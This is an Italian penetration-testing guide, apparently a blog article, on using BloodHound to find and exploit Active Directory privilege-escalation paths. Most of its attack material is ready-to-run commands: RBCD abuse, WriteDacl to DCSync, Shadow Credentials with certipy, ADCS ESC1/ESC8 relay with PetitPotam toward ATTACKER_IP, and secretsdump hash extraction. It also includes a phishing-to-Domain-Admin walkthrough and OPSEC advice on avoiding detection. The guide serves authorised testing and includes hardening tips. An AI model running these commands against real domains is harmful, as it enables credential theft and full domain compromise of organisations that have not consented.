---
title: 'BloodHound Pentest AD: Privilege Escalation e Domain Admin'
slug: bloodhound
description: 'BloodHound per privilege escalation su Active Directory: SharpHound, edge abuse, Shadow Credentials e ADCS. Guida italiana pentest AD verso Domain Admin.'
image: /bloodhound-active-directory-attack-path-domain-admin.png.webp
draft: false
date: 2026-01-23T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - bloodhound
  - active directory
featured: false
---

> **In sintesi:** BloodHound è uno strumento open source per l'analisi degli attack path in Active Directory basato su teoria dei grafi. Si usa per identificare percorsi di privilege escalation verso Domain Admin in ambienti Windows enterprise. Richiede credenziali di un utente di dominio standard e permette di visualizzare graficamente relazioni ACL, sessioni e deleghe Kerberos.

BloodHound prende un dominio Active Directory con migliaia di utenti, gruppi, computer e GPO e lo trasforma in una mappa di relazioni che risponde a una sola domanda: **qual è il percorso più breve verso Domain Admin?**

Non serve essere un esperto AD per usarlo. Bastano credenziali di un utente standard, tre minuti di raccolta dati e BloodHound ti mostra — graficamente — chi può fare cosa, chi ha sessioni dove, e quali permessi anomali aprono strade verso la compromissione totale del dominio.

Questa guida copre installazione, raccolta con SharpHound, analisi degli attack paths, **abuse operativo per ogni edge**, Shadow Credentials, ADCS integration, Top 10 findings e cheat sheet finale. È il riferimento offensivo BloodHound per chi fa penetration test AD.

***

## Cos'è BloodHound e come funziona in un pentest Active Directory?

BloodHound è una piattaforma di analisi della sicurezza per ambienti Active Directory basata su **teoria dei grafi**. Raccoglie dati dal dominio (utenti, gruppi, computer, sessioni, ACL, GPO, deleghe Kerberos) e li memorizza in un database a grafo, poi li interroga per trovare percorsi di escalation dei privilegi che un'analisi manuale non troverebbe mai in tempi ragionevoli.

Il concetto chiave: **Active Directory è una rete di relazioni, non un elenco di utenti**. Ogni assegnazione di permessi, ogni membership di gruppo, ogni sessione aperta è un arco nel grafo. BloodHound trova le catene di archi che portano da un utente compromesso a Domain Admin.

Domande concrete a cui risponde:

* Quali utenti hanno un percorso verso Domain Admin, anche indiretto?
* Chi ha GenericAll, WriteDacl, WriteOwner su oggetti critici?
* Dove ci sono sessioni amministrative sfruttabili per pivot?
* Quali computer hanno unconstrained delegation?
* Chi può fare DCSync?
* Quali template ADCS sono vulnerabili e chi li può sfruttare?

***

## Architettura — chi fa cosa

**Database a grafo (Neo4j / stack CE)**
Memorizza nodi (User, Group, Computer, GPO, OU, Domain) e relazioni (MemberOf, AdminTo, HasSession, GenericAll, WriteDacl…). È il motore del pathfinding multi-step.

**Collector (SharpHound / bloodhound-python)**
Raccoglie i dati dal dominio e produce file JSON/ZIP importabili. Non fa analisi — produce solo il dataset grezzo.

**GUI BloodHound**
Interfaccia di analisi: import dati, query predefinite, pathfinding interattivo, Node Info, query Cypher custom.

***

## Come installare BloodHound CE su Kali Linux?

### Metodo 1 — Pacchetto ufficiale Kali (più semplice, consigliato)

Dal 2024 BloodHound CE è nel repository ufficiale di Kali (versione 9.1.0). Due comandi e sei operativo.

```bash
sudo apt update && sudo apt install -y bloodhound
sudo bloodhound-setup
```

`bloodhound-setup` inizializza PostgreSQL, Neo4j e crea il database. Al termine ti mostra le credenziali default Neo4j (`neo4j/neo4j`) e ti ricorda di aggiornare `/etc/bhapi/bhapi.json` con la nuova password prima di avviare.

```bash
# Avvia BloodHound CE
sudo bloodhound-start

# Ferma BloodHound CE
sudo bloodhound-stop

# Reset password admin
sudo env bhe_recreate_default_admin=true bloodhound-start
```

⚠️ Il comando `bloodhound` è deprecato su Kali — usa sempre `bloodhound-start`.

Login su `http://localhost:8080/ui/login` con `admin/admin` al primo accesso. Ti forza subito a cambiare password.

***

### Metodo 2 — Docker (ambienti custom o versione più aggiornata)

Se vuoi l'ultima versione da SpecterOps o non usi Kali, usa Docker.

**Installa docker-compose** — su Kali recente `apt install docker-compose` può dare problemi, meglio scaricare direttamente:

```bash
sudo apt update && sudo apt install -y docker.io
sudo curl -L "https://github.com/docker/compose/releases/download/v2.32.1/docker-compose-$(uname -s)-$(uname -m)" \
  -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose
docker-compose --version
```

**Scarica e avvia BloodHound CE:**

```bash
sudo mkdir /opt/bloodhoundce && cd /opt/bloodhoundce
sudo wget -q -O docker-compose.yml https://ghst.ly/getbhce
sudo docker-compose up
```

**Recupera la password iniziale** (in un altro terminale mentre i container si avviano):

```bash
sudo docker logs bloodhoundce-bloodhound-1 2>&1 | grep "Initial Password Set To:"
# oppure, se il container ha nome diverso:
sudo docker logs bloodhoundce_bloodhound_1 2>&1 | grep "Initial Password Set To:"
```

Login su `http://localhost:8080/ui/login` con username `admin` e la password dal log.

```bash
# Porta occupata
sudo ss -lntp | grep -E '8080|7474|7687'

# Restart
sudo docker-compose down && sudo docker-compose up
```

***

### Scarica SharpHound dalla GUI

Una volta loggato, scarica SharpHound e AzureHound direttamente dall'interfaccia senza cercarli su GitHub:

```
http://localhost:8080/ui/download-collectors
```

***

### bloodhound-python — da Linux senza accesso alla macchina target

Su Kali recente installa bloodhound-python in un virtual environment per evitare conflitti:

```bash
sudo apt install -y pipx
python3 -m venv /home/kali/.venv
source /home/kali/.venv/bin/activate
pip install bloodhound

# Raccolta dati
bloodhound-python -d DOMINIO.LOCAL -u utente -p 'Password' -ns IP_DC -c all
bloodhound-python -d DOMINIO.LOCAL -u utente -p 'Password' -ns IP_DC -c dconly
```

***

### Windows lab

1. Installa [Neo4j Desktop](https://neo4j.com/download/), crea DBMS, avvialo
2. Verifica su `http://localhost:7474`
3. Scarica BloodHound legacy da [GitHub](https://github.com/BloodHoundAD/BloodHound/releases), avvia `BloodHound.exe`

***

## Come raccogliere dati con SharpHound senza fare rumore?

Non usare subito `--CollectionMethods All`. Struttura la raccolta per fasi: meno rumore, dati più mirati.

**Fase 1 — mappatura iniziale (low noise)**

```powershell
SharpHound.exe --CollectionMethods Default,GroupMembership --Throttle 1000 --ExcludeDomainControllers
```

**Fase 2 — sessioni e admin locali**

```powershell
SharpHound.exe --CollectionMethods Session,LocalAdmin --Stealth
```

**Fase 3 — ACL (la fase più importante per trovare abuse paths)**

```powershell
SharpHound.exe --CollectionMethods ACL,Container,DCOM
```

**Fase 4 — loop sessioni**

```powershell
SharpHound.exe --CollectionMethods Session --Loop --LoopDuration 01:00:00
```

**Raccolta completa**

```powershell
SharpHound.exe --CollectionMethods All
```

### bloodhound-python — da Linux senza accesso diretto alla macchina

```bash
pip3 install bloodhound
bloodhound-python -d DOMINIO.LOCAL -u utente -p 'Password' -ns IP_DC -c all
```

***

## Import dati

**Legacy:** *Upload Data* → ZIP SharpHound.
**CE:** *File Ingest* → ZIP o JSON multipli.

Se non vedi nulla dopo import: Neo4j avviato? Credenziali DB corrette? ZIP non annidato? Versione collector compatibile?

***

## Uso pratico della GUI — BloodHound Tutorial

### Query predefinite

* **Find Shortest Paths to Domain Admins**
* **Find Principals with DCSync Rights**
* **Find Computers with Unconstrained Delegation**
* **Users with Most Local Admin Rights**
* **Dangerous ACLs (WriteDacl/GenericAll/WriteOwner)**

### Pathfinding

Source: utente compromesso → Target: `DOMAIN ADMINS` o `DC01`.
BloodHound disegna la catena. Leggi da sinistra a destra: ogni arco è una relazione abusabile.

### Node Info

Clicca qualsiasi nodo:

* **Inbound Control Rights** — chi controlla questo oggetto
* **Outbound Control Rights** — cosa controlla questo oggetto

Guarda sempre Outbound Control Rights su oggetti Tier-0.

***

## Oggetti Tier-0 — cosa controllare subito in ogni assessment

In ogni assessment BloodHound, la prima cosa da fare è verificare chi ha controllo diretto o indiretto su questi oggetti. Compromettere uno qualsiasi di questi significa compromettere il dominio.

| Oggetto            | Perché è Tier-0                                        |
| ------------------ | ------------------------------------------------------ |
| Domain Admins      | Accesso admin a tutti i computer del dominio           |
| Enterprise Admins  | Accesso admin a tutta la forest                        |
| Administrators     | Gruppo locale sui DC — equivale a DA                   |
| Domain Controllers | I DC stessi — chi li controlla controlla il dominio    |
| AdminSDHolder      | Template ACL per tutti gli account protetti            |
| KRBTGT             | Hash compromesso = Golden Ticket infiniti              |
| PKI / CA           | Compromissione ADCS = certificati per qualsiasi utente |
| ADFS               | Federation service — lateral movement verso cloud      |

Usa questa query per vedere chi ha percorsi verso i Tier-0:

```cypher
MATCH (u:User), (g:Group {highvalue:true}),
p=shortestPath((u)-[*1..]->(g))
WHERE NOT u.name STARTS WITH 'DOMAIN ADMINS'
RETURN p
```

***

## BloodHound Edge Abuse Reference — Come sfruttare ogni relazione

Questa è la sezione che manca nella maggior parte delle guide. BloodHound trova le relazioni, ma il lavoro reale è capire come sfruttarle. Tabella riassuntiva + dettaglio operativo per ogni edge.

| Edge                 | Impatto             | Abuse Primario                     |
| -------------------- | ------------------- | ---------------------------------- |
| GenericAll           | Full Control        | Reset Password, RBCD, Shadow Creds |
| GenericWrite         | Write Attributes    | Shadow Credentials, SPN Kerberoast |
| WriteDacl            | ACL Control         | Self-assign DCSync / AddMember     |
| WriteOwner           | Ownership Takeover  | Diventa owner → WriteDacl          |
| ForceChangePassword  | Account Takeover    | Password Reset via MSRPC           |
| AddMember            | Group Escalation    | Aggiungiti al gruppo               |
| AllowedToAct         | RBCD                | S4U2Proxy impersonation            |
| ReadLAPSPassword     | Local Admin Read    | Lateral Movement                   |
| AllExtendedRights    | Multiple Rights     | ForceChangePassword + ReadLAPS     |
| AddKeyCredentialLink | Shadow Credentials  | PKINIT → NTLM hash                 |
| SQLAdmin             | SQL Access          | xp\_cmdshell → RCE                 |
| ExecuteDCOM          | Remote Execution    | Lateral Movement                   |
| CanPSRemote          | PowerShell Remoting | Remote Shell                       |
| CanRDP               | Interactive Access  | Session access                     |
| AdminTo              | Local Admin         | Credential dump                    |
| HasSession           | Sessione Attiva     | Token/hash capture                 |
| DCSync               | Replication Rights  | Hash dump completo                 |
| Owns                 | Object Ownership    | WriteDacl chain                    |

***

### GenericAll su User

```bash
net rpc password "TARGET_USER" "NewPass123!" -U "DOMINIO/attacker%Password" -S DC_IP
nxc smb DC_IP -u attacker -p 'Password' -d DOMINIO --set-password TARGET_USER 'NewPass123!'
```

### GenericAll su Computer → RBCD

```bash
impacket-addcomputer DOMINIO/attacker:'Password' -computer-name 'FAKE$' -computer-pass 'FakePass123!'
impacket-rbcd DOMINIO/attacker:'Password' -action write -delegate-from 'FAKE$' -delegate-to 'TARGET$' -dc-ip DC_IP
impacket-getST DOMINIO/'FAKE$':'FakePass123!' -spn cifs/TARGET.DOMINIO.LOCAL -impersonate Administrator -dc-ip DC_IP
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass TARGET.DOMINIO.LOCAL
```

### GenericAll / GenericWrite su Group → AddMember

```bash
net rpc group addmem "GRUPPO_TARGET" "attacker" -U "DOMINIO/attacker%Password" -S DC_IP
nxc ldap DC_IP -u attacker -p 'Password' -d DOMINIO --add-user-to-group "attacker" "GRUPPO_TARGET"
```

### WriteDacl → DCSync

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

```bash
impacket-secretsdump DOMINIO/attacker:'Password'@DC_IP -just-dc-ntlm
```

→ Vedi [DCSync](https://hackita.it/articoli/dcsync/)

### WriteOwner

```powershell
Set-DomainObjectOwner -Identity "GRUPPO_TARGET" -OwnerIdentity attacker
Add-DomainObjectAcl -TargetIdentity "GRUPPO_TARGET" -PrincipalIdentity attacker -Rights WriteMembers
```

### ForceChangePassword

```bash
net rpc password "TARGET_USER" "NewPass123!" -U "DOMINIO/attacker%Password" -S DC_IP
```

⚠️ Genera eventi 4723/4724 — visibile nei log.

### AdminTo + HasSession → Lateral Movement

```bash
evil-winrm -i SRV01 -u attacker -p 'Password'
```

→ Vedi [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/) | [Mimikatz](https://hackita.it/articoli/mimikatz/)

### DCSync Rights

```bash
impacket-secretsdump DOMINIO/attacker:'Password'@DC_IP -just-dc-ntlm
```

→ Vedi [DCSync](https://hackita.it/articoli/dcsync/) | [Kerberos](https://hackita.it/articoli/kerberos/)

### Unconstrained Delegation

```powershell
Rubeus.exe monitor /interval:5 /nowrap
```

→ Vedi [Rubeus](https://hackita.it/articoli/rubeus/)

### ReadLAPSPassword / AllExtendedRights

```bash
nxc ldap DC_IP -u attacker -p 'Password' -d DOMINIO -M laps
```

***

## Cos'è l'attacco Shadow Credentials e quando si usa?

Shadow Credentials è l'abuse più usato nel 2026 quando BloodHound mostra `GenericWrite` o `AddKeyCredentialLink` su un utente o computer. Non serve resettare la password — è più silenzioso e reversibile.

**Come funziona:** Active Directory supporta autenticazione tramite chiavi pubbliche (PKINIT). Se hai `GenericWrite` su un oggetto, puoi aggiungere una chiave pubblica al suo attributo `msDS-KeyCredentialLink`. Poi usi la chiave privata corrispondente per autenticarti via Kerberos PKINIT e ottenere l'hash NTLM dell'account target senza toccare la password.

**Requisiti:** almeno un DC Windows Server 2016+ con PKINIT attivo.

```bash
pip3 install certipy-ad

certipy shadow auto -u attacker@corp.local -p 'Password' -account TARGET_USER -dc-ip DC_IP
```

Output diretto: hash NTLM di `TARGET_USER`.

```bash
# Per un computer account
certipy shadow auto -u attacker@corp.local -p 'Password' -account TARGET_COMPUTER$ -dc-ip DC_IP
```

**Cleanup:**

```bash
certipy shadow add    # aggiunge
certipy shadow remove # rimuove — certipy shadow auto rimuove in automatico
```

***

## AddKeyCredentialLink — Edge Dedicato

BloodHound mostra `AddKeyCredentialLink` separatamente da GenericWrite. La tecnica è identica a Shadow Credentials — l'edge rappresenta esattamente il permesso di scrivere su `msDS-KeyCredentialLink`.

```bash
certipy shadow auto -u attacker@corp.local -p 'Password' -account TARGET -dc-ip DC_IP
```

***

## BloodHound e Active Directory Certificate Services (ADCS)

BloodHound CE ha integrazione nativa con ADCS. In quasi ogni assessment AD moderno, i template ADCS vulnerabili sono tra i percorsi più veloci verso Domain Admin. Per una copertura completa di tutti gli ESC da 1 a 16 vedi [ADCS ESC1–ESC16](https://hackita.it/articoli/adcs-esc1-esc16/).

### ESC1 — Template con SAN controllabile

```bash
certipy find -u attacker@corp.local -p 'Password' -dc-ip DC_IP -vulnerable
certipy req -u attacker@corp.local -p 'Password' -ca CA_NAME -template TEMPLATE_VULNERABILE -upn administrator@corp.local -dc-ip DC_IP
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

→ Vedi [ESC1](https://hackita.it/articoli/esc1-adcs/)

### ESC4 — WriteProperty sul template

```bash
certipy template -u attacker@corp.local -p 'Password' -template TEMPLATE -save-old
# Poi sfrutta come ESC1
```

→ Vedi [ESC4](https://hackita.it/articoli/esc4-adcs/)

### ESC8 — NTLM Relay verso Web Enrollment

```bash
impacket-ntlmrelayx -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
python3 PetitPotam.py ATTACKER_IP DC_IP
```

→ Vedi [ESC8](https://hackita.it/articoli/esc8-adcs/)

### ESC13 — Group-Linked Template Abuse

→ Vedi [ESC13](https://hackita.it/articoli/esc13-adcs/)

***

## Top 10 BloodHound Findings — Privilege Escalation Checklist

**1. DCSync Rights** — chi oltre ai DC ha `DS-Replication-Get-Changes-All`? → Compromissione immediata di tutti gli hash.

**2. GenericAll su oggetti Tier-0** — game over.

**3. WriteDacl sul Domain Object** — permette di assegnarsi DCSync rights.

**4. Shadow Credentials (GenericWrite / AddKeyCredentialLink)** — il finding più comune nel 2026. Silenzioso e reversibile.

**5. Unconstrained Delegation su Computer non-DC** — cattura TGT di DA che si autenticano verso quel server.

**6. RBCD (AllowedToAct)** — impersona chiunque verso il computer target.

**7. ReadLAPSPassword** — lateral movement immediato su tutte le macchine gestite da LAPS.

**8. DA Session su Workstation Utente** — trova la workstation, accedi, dumpa le credenziali.

**9. AdminSDHolder Abuse** — permessi anomali si propagano a tutti gli account protetti ogni 60 minuti.

**10. ADCS ESC Paths** — ESC1 e ESC8 sono i più frequenti nei domini enterprise.

***

## Query Cypher — BloodHound Cheat Sheet

**Attack paths verso DA da utenti Kerberoastable**

```cypher
MATCH (u:User {hasspn:true}), (g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}),
p=shortestPath((u)-[*1..]->(g))
RETURN p
```

**ACL pericolose su oggetti Tier-0**

```cypher
MATCH (u:User)-[r:GenericAll|WriteDacl|WriteOwner|GenericWrite|Owns|AddKeyCredentialLink]->(n)
WHERE n.highvalue = true
RETURN u.name, type(r), n.name
ORDER BY type(r)
```

**Computer con unconstrained delegation (no DC)**

```cypher
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.name STARTS WITH 'DC'
RETURN c.name
```

**Sessioni DA attive su workstation**

```cypher
MATCH (u:User {admincount:true})-[:HasSession]->(c:Computer)
WHERE NOT c.name CONTAINS 'SRV'
RETURN u.name, c.name
```

**Utenti con GenericWrite su altri utenti**

```cypher
MATCH (u:User)-[r:GenericWrite|GenericAll|AddKeyCredentialLink]->(t:User)
WHERE NOT u.name = t.name
RETURN u.name, type(r), t.name
```

***

## Scenario pratico — da utente standard a Domain Admin

Scenario: credenziali di `j.smith@corp.local` da phishing.

**1. Raccogli dati**

```bash
bloodhound-python -d corp.local -u j.smith -p 'Pass123!' -ns 10.10.10.10 -c all
```

**2. Importa e lancia Shortest Path to Domain Admins**

BloodHound mostra:

```
j.smith → MemberOf → HelpDesk_Ops
HelpDesk_Ops → AdminTo → SRV-WEB01
SRV-WEB01 → HasSession → svc_sql
svc_sql → MemberOf → Domain Admins
```

**3. Accedi a SRV-WEB01**

```bash
evil-winrm -i 10.10.10.20 -u j.smith -p 'Pass123!'
```

**4. Dump credenziali sessione svc\_sql**

→ Vedi [Mimikatz](https://hackita.it/articoli/mimikatz/) | [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/)

**5. DCSync finale**

```bash
impacket-secretsdump corp.local/svc_sql:'SvcPass!'@10.10.10.10 -just-dc-ntlm
```

***

## OPSEC — cosa genera rumore

**SharpHound `--All`**: query LDAP ad alto volume verso i DC. Usa le fasi + `--Throttle`.

**Session enumeration**: connessioni SMB verso ogni host — rilevano come scan interno.

**ACL abuse**: genera eventi 4662, 4728, 4732 nei log AD.

**Shadow Credentials**: genera evento 5136 (modifica attributo oggetto AD).

Mitigazioni: raccolta in fasi, `--Stealth`, `bloodhound-python` da Kali, `ldapdomaindump` o `windapsearch` come alternative più silenziose.

***

## Hardening AD — come ridurre l'attack surface

Ripulisci ACL pericolose con la query BH "Dangerous ACLs". Pulisci privilege creep ogni trimestre. Separa i tier (Tier 0 / Tier 1 / Tier 2). Implementa LAPS per eliminare password condivise. Disabilita unconstrained delegation dove non serve. Controlla chi può modificare le GPO. Esegui `certipy find -vulnerable` trimestralmente sui template ADCS.

***

## BloodHound Workflow — Cheat Sheet Finale

```
1.  COLLECT     → SharpHound per fasi (Default → LocalAdmin+Session → ACL)
2.  IMPORT      → Carica ZIP in BloodHound CE / legacy
3.  DA PATHS    → Find Shortest Paths to Domain Admins
4.  TIER-0      → Controlla chi ha controllo su DA, EA, DC, KRBTGT, PKI
5.  ACL AUDIT   → Dangerous ACLs (GenericAll, WriteDacl, WriteOwner, AddKeyCredentialLink)
6.  SESSIONS    → DA sessions su workstation non-admin
7.  DELEGATION  → Unconstrained Delegation + RBCD paths
8.  DCSYNC      → Chi ha DS-Replication-Get-Changes-All oltre ai DC
9.  ADCS        → BloodHound CE ESC paths + certipy find -vulnerable
10. VALIDATE    → Testa l'abuse su ogni finding critico
11. REPORT      → Documenta path, screenshot, impatto, remediation
```

***

## FAQ

**Cos'è BloodHound e a cosa serve?**
BloodHound è uno strumento open source per l'analisi degli attack path in Active Directory. Raccoglie dati dal dominio tramite SharpHound e li visualizza come grafo, permettendo di trovare il percorso più breve verso Domain Admin anche partendo da un utente standard.

**Come si installa BloodHound CE su Kali Linux?**
BloodHound CE si installa tramite Docker: `sudo apt install docker.io docker-compose`, poi `curl -L https://ghst.ly/getbhce -o docker-compose.yml` e `sudo docker-compose up -d`. L'interfaccia web è disponibile su `http://localhost:8080`.

**Cosa sono i BloodHound edges e come si abusano?**
Gli edges di BloodHound rappresentano relazioni tra oggetti AD. I più pericolosi: GenericAll (reset password o RBCD), WriteDacl (self-assign DCSync), WriteOwner (cambio owner → WriteDacl), AddKeyCredentialLink (Shadow Credentials → hash NTLM senza reset password).

**Cos'è l'attacco Shadow Credentials con BloodHound?**
Shadow Credentials sfrutta il permesso GenericWrite o AddKeyCredentialLink su un oggetto AD. Aggiunge una chiave pubblica all'attributo `msDS-KeyCredentialLink` del target e ottiene l'hash NTLM via PKINIT senza resettare la password. Si esegue con `certipy shadow auto`. Richiede DC Windows Server 2016+.

**BloodHound viene rilevato dagli antivirus?**
SharpHound viene flaggato da molti AV/EDR per firma. In ambienti con EDR attivo usa bloodhound-python da Linux, che genera meno rumore sul target.

**BloodHound CE o legacy — qual è la differenza?**
BloodHound CE con Docker è il metodo attuale e raccomandato. Legacy è ancora usato in lab vecchi. Le query Cypher funzionano su entrambi, ma la UI è diversa.

**Posso usare BloodHound senza essere admin del dominio?**
Sì. Un utente standard raccoglie la maggior parte dei dati (group membership, ACL, sessioni) tramite query LDAP autenticate normali.

**Shadow Credentials funziona sempre?**
Richiede almeno un DC Windows Server 2016+ con PKINIT attivo. In domini con solo DC Windows 2008/2012 non funziona.

***

> **Disclaimer:** tutto il contenuto è per uso su sistemi autorizzati in contesti di penetration test legali o audit difensivo. L'uso non autorizzato è illegale.
